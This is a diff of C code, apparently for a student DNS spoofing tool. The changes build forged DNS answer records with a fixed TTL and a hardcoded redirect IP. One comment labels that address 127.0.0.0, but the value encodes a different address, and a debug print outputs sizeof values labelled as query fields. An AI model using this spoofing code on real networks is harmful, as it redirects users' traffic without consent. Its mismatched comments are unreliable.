@@ -56,16 +56,17 @@ struct dns_query {
 	u_short class;
 };
 
-struct dns_answer_data {
+struct dns_answer_data{
 	u_short type;
 	u_short class;
-};
+	u_int ttl;    // 4 bytes for ttl
+	u_short rdlength;    // 2 bytes for rdlength. This will be set to 4.
+	u_int rdata; // 4 bytes for the IP address
+} __attribute__((packed, aligned(1)));
 
 struct dns_answer {
 	u_char name[10000];
 	u_char separator;
-	u_short type;
-	u_short class;
 };
 
 #define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
@@ -279,8 +280,16 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 
 				// Copying the null terminator for end of the domain and also copying the type and class fields
 				spoofed_dns_answer->separator = 0;
-				spoofed_dns_answer->type = query->type;
-				spoofed_dns_answer->class = query->class;
+
+				// Populating Answer Data
+				struct dns_answer_data* answer_data;
+				answer_data = (struct dns_answer_data*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+									+ strlen(domain) + 1);
+				answer_data->type = query->type;
+				answer_data->class = query->class;
+				answer_data->ttl = htonl(600); // Keeping a 
+				answer_data->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
+				answer_data->rdata = htonl(2899903684);  // 127.0.0.0
 
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
@@ -288,7 +297,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
 					sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
 					sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
-					sprintf(args + strlen(args), " Query Type %d Query Class %d ", query->type, query->class);
+					sprintf(args + strlen(args), " Query Type %lu Query Class %lu ", sizeof(u_int), sizeof(u_long));
 					printf("%s\n", args);
 					print_payload(*payload, *size_payload);
 					printf("Response Start\n");
@@ -296,10 +305,6 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 						+ strlen(domain) + 1 + sizeof(struct dns_answer_data));
 					printf("Response End\n");
-					printf("Query Start\n");
-					pay1 = (u_char*)query;
-					print_payload(pay1, 4);
-					printf("Query End\n");
 				}
 			}
 			break;
